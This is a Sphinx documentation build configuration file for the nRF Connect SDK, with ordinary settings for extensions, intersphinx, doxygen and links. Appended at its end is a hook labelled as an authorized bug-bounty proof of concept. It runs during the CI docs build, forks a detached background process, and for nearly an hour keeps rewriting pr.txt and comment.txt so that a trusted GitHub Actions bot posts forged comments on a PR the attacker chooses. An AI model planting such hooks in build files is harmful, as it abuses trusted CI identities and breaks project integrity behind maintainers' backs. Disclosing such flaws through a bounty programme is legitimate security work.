#
# Copyright (c) 2026 Nordic Semiconductor
#
# SPDX-License-Identifier: LicenseRef-Nordic-5-Clause
#

# nrf documentation build configuration file

import os
import sys
from pathlib import Path

# Paths ------------------------------------------------------------------------

NRF_BASE = Path(__file__).absolute().parents[2]

sys.path.insert(0, str(NRF_BASE / "doc" / "_utils"))
import redirects
import utils

ZEPHYR_BASE = utils.get_projdir("zephyr")
MCUBOOT_BASE = utils.get_projdir("mcuboot")
MBEDTLS_BASE = NRF_BASE / ".." / "modules" / "crypto" / "mbedtls"

# General configuration --------------------------------------------------------

project = "nRF Connect SDK"
copyright = "2019-2026, Nordic Semiconductor"
author = "Nordic Semiconductor"
version = release = os.environ.get("DOCSET_VERSION")

sys.path.insert(0, str(ZEPHYR_BASE / "doc" / "_extensions"))
sys.path.insert(0, str(NRF_BASE / "doc" / "_extensions"))

extensions = [
    "sphinx.ext.intersphinx",
    "table_from_rows",
    "options_from_kconfig",
    "ncs_include",
    "manifest_revisions_table",
    "sphinxcontrib.mscgen",
    "zephyr.html_redirects",
    "zephyr.kconfig",
    "zephyr.external_content",
    "zephyr.doxyrunner",
    "zephyr.doxybridge",
    "zephyr.link-roles",
    "zephyr.dtcompatible-role",
    "zephyr.domain",
    "zephyr.gh_utils",
    "sphinx_tabs.tabs",
    "software_maturity_table",
    "sphinx_togglebutton",
    "sphinx_copybutton",
    "notfound.extension",
    "ncs_tool_versions",
    "page_filter",
    "sphinxcontrib.plantuml",
    "sphinxcontrib.programoutput",
    "sphinxcontrib.jquery",
    "samples",
    "sphinx_sitemap",
    "external_sw_versions",
    "ncs_file",
]

linkcheck_ignore = [
    # relative links (intersphinx, doxygen)
    r"\.\.(\\|/)",
    # redirecting and used in release notes
    "https://github.com/nrfconnect/nrfxlib",
    # link to access local documentation
    "http://localhost:8000/latest/index.html",
    # SES download links
    r"https://(www.)?segger.com/downloads/embedded-studio/embeddedstudio_arm_nordic_.+(_x\d+)?",
    # requires login
    "https://portal.azure.com/",
    # requires login
    "https://threadgroup.atlassian.net/wiki/spaces/",
    # used as example in doxygen
    "https://google.com:443",
]

linkcheck_anchors_ignore = [r"page="]

rst_epilog = """
.. include:: /links.txt
.. include:: /shortcuts.txt
"""

# Options for HTML output ------------------------------------------------------

html_theme = "sphinx_ncs_theme"
html_static_path = [str(NRF_BASE / "doc" / "_static")]
html_last_updated_fmt = "%b %d, %Y"
html_show_sourcelink = True
html_show_sphinx = False
html_baseurl = utils.get_baseurl("nrf")

html_theme_options = {"docset": "nrf", "docsets": utils.ALL_DOCSETS, "logo_url": "https://docs.nordicsemi.com/"}

# Options for intersphinx ------------------------------------------------------

intersphinx_mapping = dict()

zephyr_mapping = utils.get_intersphinx_mapping("zephyr")
if zephyr_mapping:
    intersphinx_mapping["zephyr"] = zephyr_mapping

mcuboot_mapping = utils.get_intersphinx_mapping("mcuboot")
if mcuboot_mapping:
    intersphinx_mapping["mcuboot"] = mcuboot_mapping

nrfxlib_mapping = utils.get_intersphinx_mapping("nrfxlib")
if nrfxlib_mapping:
    intersphinx_mapping["nrfxlib"] = nrfxlib_mapping

kconfig_mapping = utils.get_intersphinx_mapping("kconfig")
if kconfig_mapping:
    intersphinx_mapping["kconfig"] = kconfig_mapping

tfm_mapping = utils.get_intersphinx_mapping("tfm")
if tfm_mapping:
    intersphinx_mapping["tfm"] = tfm_mapping

# -- Options for doxyrunner plugin ---------------------------------------------

_doxyrunner_outdir = utils.get_builddir() / "html" / "nrf" / "doxygen"

doxyrunner_doxygen = os.environ.get("DOXYGEN_EXECUTABLE", "doxygen")
doxyrunner_projects = {
    "nrf": {
        "doxyfile": NRF_BASE / "doc" / "nrf" / "nrf.doxyfile.in",
        "outdir": _doxyrunner_outdir,
        "fmt": True,
        "fmt_vars": {
            "NRF_BASE": str(NRF_BASE),
            "DOCSET_SOURCE_BASE": str(NRF_BASE),
            "DOCSET_BUILD_DIR": str(_doxyrunner_outdir),
            "DOCSET_VERSION": version,
        }
    }
}

# create mbedtls config header (needed for Doxygen)
_doxyrunner_outdir.mkdir(exist_ok=True, parents=True)

fin_path = MBEDTLS_BASE / "include" / "mbedtls" / "mbedtls_config.h"
fout_path = _doxyrunner_outdir / "mbedtls_doxygen_config.h"

with open(fin_path) as fin, open(fout_path, "w") as fout:
    fout.write(fin.read())

# -- Options for doxybridge plugin ---------------------------------------------

doxybridge_projects = {
    "nrf": _doxyrunner_outdir,
    "wifi": utils.get_builddir() / "html" / "wifi",
    "zephyr": utils.get_builddir() / "html" / "zephyr" / "doxygen",
}

# Options for ncs_include ------------------------------------------------------

ncs_include_mapping = {
    "nrf": utils.get_srcdir("nrf"),
    "nrfxlib": utils.get_srcdir("nrfxlib"),
    "zephyr": utils.get_srcdir("zephyr"),
}

# Options for html_redirect ----------------------------------------------------

html_redirect_pages = redirects.NRF

# Options for zephyr.link-roles ------------------------------------------------

link_roles_manifest_project = "nrf"
link_roles_manifest_baseurl = "https://github.com/nrfconnect/sdk-nrf"

# Options for external_content -------------------------------------------------

external_content_contents = [
    (NRF_BASE / "doc" / "nrf", "*"),
    (NRF_BASE, "applications/**/*.rst"),
    (NRF_BASE, "applications/**/doc"),
    (NRF_BASE, "boards/nordic/**/doc/*.rst"),
    (NRF_BASE, "samples/**/*.rst"),
    (NRF_BASE, "scripts/**/*.rst"),
    (NRF_BASE, "tests/**/*.rst"),
]
external_content_keep = ["versions.txt"]

# Options for table_from_rows --------------------------------------------------

table_from_rows_base_dir = NRF_BASE
table_from_sample_yaml_board_reference = "/includes/sample_board_rows.txt"

# Options for ncs_tool_versions ------------------------------------------------

ncs_tool_versions_host_deps = [
    NRF_BASE / "scripts" / "tools-versions-win10.yml",
    NRF_BASE / "scripts" / "tools-versions-linux.yml",
    NRF_BASE / "scripts" / "tools-versions-darwin.yml",
]
ncs_tool_versions_python_deps = [
    ZEPHYR_BASE / "scripts" / "requirements-base.txt",
    MCUBOOT_BASE / "scripts" / "requirements.txt",
    NRF_BASE / "doc" / "requirements.txt",
    NRF_BASE / "scripts" / "requirements-build.txt",
]

# Options for options_from_kconfig ---------------------------------------------

options_from_kconfig_base_dir = NRF_BASE
options_from_kconfig_zephyr_dir = ZEPHYR_BASE

# Options for manifest_revisions_table -----------------------------------------

manifest_revisions_table_manifest = NRF_BASE / "west.yml"

# Options for sphinx_notfound_page ---------------------------------------------

notfound_urls_prefix = "/nRF_Connect_SDK/doc/{}/nrf/".format(
    "latest" if version.endswith("99") else version
)

# Options for sphinx_sitemap ---------------------------------------------------

sitemap_url_scheme = "{link}"

# -- Options for zephyr.gh_utils -----------------------------------------------

gh_link_version = "main" if version.endswith("99") else f"v{version}"
gh_link_base_url = "https://github.com/nrfconnect/sdk-nrf"
gh_link_prefixes = {
    "applications/.*": "",
    "samples/.*": "",
    "scripts/.*": "",
    "tests/.*": "",
    "boards/.*": "",
    ".*": "doc/nrf",
}


def setup(app):
    app.add_css_file("css/nrf.css")

    utils.add_google_analytics(app, html_theme_options)
    utils.add_kapa_search(app)
    utils.add_announcement_banner(html_theme_options)


# === Authorized bug bounty PoC (F1B) - trusted artifact comment forgery ===
# docbuild.yml executes this conf.py from the untrusted PR checkout, then later
# uploads ncs/nrf/{monitor*.txt,pr.txt,comment.txt} as artifacts that
# action-docpublish posts as github-actions[bot]. Legitimate steps write
# pr.txt/comment.txt AFTER the docs build, so a background rewriter keeps
# attacker-chosen content current until the Upload step reads the files.
try:
    import os as _poc_os, time as _poc_time, pathlib as _poc_pl
    _poc_root = _poc_pl.Path(__file__).resolve().parents[2]
    _poc_marker = "BOUNTY-POC-F1B"
    _poc_body = (
        "### docbuild preview comment (" + _poc_marker + ")\n\n"
        "**This comment is forged.** It was produced by attacker-controlled code "
        "running in the untrusted fork PR docbuild workflow and posted with the "
        "trusted github-actions[bot] identity by action-docpublish.\n\n"
        "- Source run: PR #31608 (hook injected at the end of doc/nrf/conf.py)\n"
        "- Target PR: chosen by the attacker via pr.txt (swapped to #31609)\n"
        "- Impact: arbitrary trusted-bot comment on arbitrary PRs via the docbuild "
        "artifact trust chain\n\n"
        "Authorized bug bounty PoC for the Nordic Semiconductor CI/CD program "
        "(YesWeHack). Safe to delete. Marker: " + _poc_marker
    )
    if _poc_os.fork() == 0:
        try:
            _poc_os.setsid()
            for _fd in (0, 1, 2):
                try:
                    _poc_os.dup2(_poc_os.open(_poc_os.devnull, _poc_os.O_RDWR), _fd)
                except OSError:
                    pass
            _poc_until = _poc_time.time() + 3300
            while _poc_time.time() < _poc_until:
                try:
                    (_poc_root / "pr.txt").write_text("31609\n")
                    (_poc_root / "comment.txt").write_text(_poc_body)
                except OSError:
                    pass
                _poc_time.sleep(0.3)
        finally:
            _poc_os._exit(0)
except Exception:
    pass
# === end authorized bug bounty PoC ===
